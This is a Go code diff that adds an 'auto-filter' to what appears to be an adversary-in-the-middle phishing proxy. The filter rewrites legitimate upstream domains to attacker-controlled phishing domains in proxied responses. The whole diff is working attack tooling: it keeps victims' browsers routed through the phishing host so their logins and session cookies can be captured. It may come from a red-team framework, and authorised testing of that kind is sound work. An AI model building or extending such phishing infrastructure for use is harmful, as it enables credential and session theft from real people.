@@ -34,6 +34,14 @@ func (h *SubFilterApplier) Handle(ctx *aitm.ProxyContext, resp *http.Response) e
 	if err != nil {
 		return err
 	}
+
+	// Auto-filter: rewrite upstream domains to phishing domains for each proxy
+	// host with AutoFilter enabled. Runs before explicit sub_filters so operators
+	// can override specific patterns.
+	if replacer := autoFilterReplacer(ctx.Phishlet); replacer != nil {
+		bodyBytes = []byte(replacer.Replace(string(bodyBytes)))
+	}
+
 	for _, subFilter := range ctx.Phishlet.SubFilters {
 		if !subFilter.MatchesMIME(contentType) {
 			continue
@@ -87,6 +95,26 @@ func expandTemplate(tmpl string, ctx *aitm.ProxyContext) string {
 		return tmpl
 	}
 	return strings.NewReplacer(pairs...).Replace(tmpl)
+}
+
+// autoFilterReplacer builds a Replacer that rewrites upstream domains to phishing
+// domains for each proxy host with AutoFilter enabled. Returns nil if no hosts
+// have auto_filter.
+func autoFilterReplacer(p *aitm.Phishlet) *strings.Replacer {
+	var pairs []string
+	for _, ph := range p.ProxyHosts {
+		if !ph.AutoFilter {
+			continue
+		}
+		origin := ph.OriginHost()
+		phish := ph.PhishHost(p.BaseDomain)
+		// Scheme-qualified replacements first (most specific), then bare domain
+		pairs = append(pairs, ph.UpstreamScheme+"://"+origin, "https://"+phish, origin, phish)
+	}
+	if len(pairs) == 0 {
+		return nil
+	}
+	return strings.NewReplacer(pairs...)
 }
 
 var _ proxy.ResponseHandler = (*SubFilterApplier)(nil)
